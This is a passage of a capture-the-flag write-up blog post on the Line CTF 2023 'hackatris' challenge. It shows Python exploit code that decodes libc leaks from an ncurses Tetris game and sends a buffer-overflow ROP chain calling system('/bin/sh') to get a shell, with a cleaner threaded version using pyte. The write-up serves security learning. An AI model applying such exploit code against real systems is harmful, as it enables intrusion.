+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>        
+    <span class="k">elif</span> <span class="n">shape</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+    <span class="k">elif</span> <span class="n">shape</span> <span class="o">==</span> <span class="mi">5</span><span class="p">:</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+    <span class="k">elif</span> <span class="n">shape</span> <span class="o">==</span> <span class="mi">6</span><span class="p">:</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span>
+        <span class="n">LEAKS</span><span class="p">[</span><span class="n">bleak</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nb">bytes</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0x41</span></code></pre></figure>
+
+<p>When we’re lucky enough and the leak for <code class="language-plaintext highlighter-rouge">system</code> gets finished in time, all there’s left to do, is to send the ropchain into <code class="language-plaintext highlighter-rouge">reward</code> to get a shell popping up.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># send ropchain to reward
+</span><span class="n">POPRDI</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x2a3e5</span>
+<span class="n">RET</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xf872e</span>
+
+<span class="n">ropchain</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
+<span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)))</span>
+<span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">RET</span><span class="p">)</span>
+<span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"aa"</span><span class="o">*</span><span class="mh">0x48</span>                 <span class="c1"># fill buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"`"</span><span class="o">*</span><span class="mi">32</span>                   <span class="c1"># skip canary+rbp
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">ropchain</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"hex"</span><span class="p">)</span>   <span class="c1"># append ropchain
+</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>Running it in two terminals will look like this:</p>
+
+<p><img src="/assets/linectf2023/hackatris/exploit.png" alt="Exploit" /></p>
+
+<p>Since the parsing via the regular expressions was a bit rough, the exploit is not super stable and will have to be run multiple times to get lucky with the blocks and the leaks, but at some point it will do the job ;)</p>
+
+<p><img src="/assets/linectf2023/hackatris/exploit_success.png" alt="Exploit" /></p>
+
+<h2 id="doing-it-cleaner-with-pyte">Doing it cleaner with pyte</h2>
+
+<p>As mentioned before, after the ctf, I saw the solution from <a href="https://chovid99.github.io/posts/line-ctf-2023/">Chovid99</a>, that used <code class="language-plaintext highlighter-rouge">pyte</code> to parse the ncurses screen. So in aftermath, I combined that with my approach to get a clean solution and serving as a lookup for future ncurses challenges for me.</p>
+
+<p>In the cleaned up exploits, I’ll create multiple threads, one for parsing the game map and one for calculating the leaks when a new block is discovered. In the main thread, we can then read user input and forward it to the service, so the leaks will be the solved “while we play”.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">parse_game_thread</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">GAME_SCREEN</span><span class="p">,</span> <span class="n">GAME_FINISHED</span>
+
+    <span class="n">screen</span> <span class="o">=</span> <span class="n">pyte</span><span class="p">.</span><span class="n">Screen</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">500</span><span class="p">)</span>
+    <span class="n">stream</span> <span class="o">=</span> <span class="n">pyte</span><span class="p">.</span><span class="n">ByteStream</span><span class="p">(</span><span class="n">screen</span><span class="p">)</span>
+
+    <span class="k">while</span> <span class="ow">not</span> <span class="n">GAME_FINISHED</span><span class="p">:</span>
+        <span class="n">b</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">b</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))</span>
+        <span class="n">stream</span><span class="p">.</span><span class="n">feed</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+        <span class="n">GAME_SCREEN</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">disp</span> <span class="ow">in</span> <span class="n">screen</span><span class="p">.</span><span class="n">display</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="mi">35</span><span class="p">]:</span>
+            <span class="n">GAME_SCREEN</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">disp</span><span class="p">[</span><span class="mi">5</span><span class="p">:])</span>
+    
+    <span class="n">log</span><span class="p">(</span><span class="s">"Parse game thread finished"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">parse_leaks</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">GAME_SCREEN</span><span class="p">,</span> <span class="n">SYSTEM_LEAK_FINISHED</span>
+    <span class="n">last_difficulty</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">search_for_new_block</span> <span class="o">=</span> <span class="bp">False</span>
+
+    <span class="k">while</span> <span class="ow">not</span> <span class="n">SYSTEM_LEAK_FINISHED</span><span class="p">:</span>
+        <span class="c1"># check if difficulty has changed =&gt; new block available
+</span>        <span class="n">difficulty</span> <span class="o">=</span> <span class="n">get_difficulty</span><span class="p">(</span><span class="n">GAME_SCREEN</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">difficulty</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">and</span> <span class="p">(</span><span class="n">difficulty</span> <span class="o">!=</span> <span class="n">last_difficulty</span><span class="p">):</span>
+            <span class="n">last_difficulty</span> <span class="o">=</span> <span class="n">difficulty</span>
+            <span class="n">search_for_new_block</span> <span class="o">=</span> <span class="bp">True</span>            
+            <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># sleep to make sure, that new block is already in screen
+</span>
+        <span class="c1"># parse until we found a new block on top of the screen
+</span>        <span class="k">if</span> <span class="n">search_for_new_block</span><span class="p">:</span>
+            <span class="n">found_block</span> <span class="o">=</span> <span class="n">get_new_block</span><span class="p">(</span><span class="n">GAME_SCREEN</span><span class="p">)</span>
+
+            <span class="k">if</span> <span class="n">found_block</span><span class="p">:</span>
+                <span class="n">log</span><span class="p">(</span><span class="s">"New block found : %s"</span> <span class="o">%</span> <span class="n">found_block</span><span class="p">)</span>
+
+                <span class="n">search_for_new_block</span> <span class="o">=</span> <span class="bp">False</span>                
+                <span class="n">parse_block</span><span class="p">(</span><span class="n">found_block</span><span class="p">,</span> <span class="n">SHAPES</span><span class="p">[</span><span class="n">SHAPE_IDX</span><span class="p">],</span> <span class="n">BLEAKS</span><span class="p">[</span><span class="n">BLEAK_IDX</span><span class="p">])</span>
+                <span class="n">pop</span><span class="p">()</span>
+                <span class="n">debug_leaks</span><span class="p">()</span>         
+                <span class="n">check_for_finished_system_leak</span><span class="p">()</span>     
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">GAME_SCREEN</span><span class="p">,</span> <span class="n">GAME_FINISHED</span>
+    
+    <span class="n">lc</span><span class="p">.</span><span class="n">srand</span><span class="p">(</span><span class="n">lc</span><span class="p">.</span><span class="n">time</span><span class="p">(</span><span class="bp">None</span><span class="p">))</span>
+
+    <span class="n">push</span><span class="p">()</span>
+    <span class="n">push</span><span class="p">()</span>
+    <span class="n">push</span><span class="p">()</span>
+    <span class="n">pop</span><span class="p">()</span>
+
+    <span class="c1"># start game parsing thread
+</span>    <span class="n">parser</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">parse_game_thread</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">())</span>
+    <span class="n">parser</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>    
+
+    <span class="c1"># start leak deobfuscator thread
+</span>    <span class="n">leaker</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">parse_leaks</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">())</span>
+    <span class="n">leaker</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
+
+    <span class="c1"># listen to input and forward to game (end game session with 'q')
+</span>    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">user_inp</span> <span class="o">=</span> <span class="nb">input</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">user_inp</span> <span class="o">==</span> <span class="s">"q"</span><span class="p">:</span>
+            <span class="n">GAME_FINISHED</span> <span class="o">=</span> <span class="bp">True</span>
+            <span class="k">break</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">user_inp</span><span class="p">)</span>
+    
+    <span class="n">leaker</span><span class="p">.</span><span class="n">join</span><span class="p">()</span></code></pre></figure>
+
+<p>When leaks are finished, we’ll just have to score and play into a game over.</p>
+
+<p>When we get to the reward screen, press <code class="language-plaintext highlighter-rouge">q</code> to finish the input thread, so the exploit can send the ropchain to it (check the attached exploit for details).</p>
+
+<p>This was a lot more stable than the previous exploit :)</p>
+
+<p><a href="https://www.youtube.com/watch?v=Bvft2pjum_E&amp;ab_channel=Kileak">Example run video</a></p>
+
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=Line CTF 2023 - hackatris&amp;url=https://kileak.github.io/ctf/2023/linectf-hackatris/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2023/linectf-hackatris/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2023/linectf-hackatris';
+        var disqus_title = 'Line CTF 2023 - hackatris';
+        var disqus_url = 'https://kileak.github.io/ctf/2023/linectf-hackatris';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
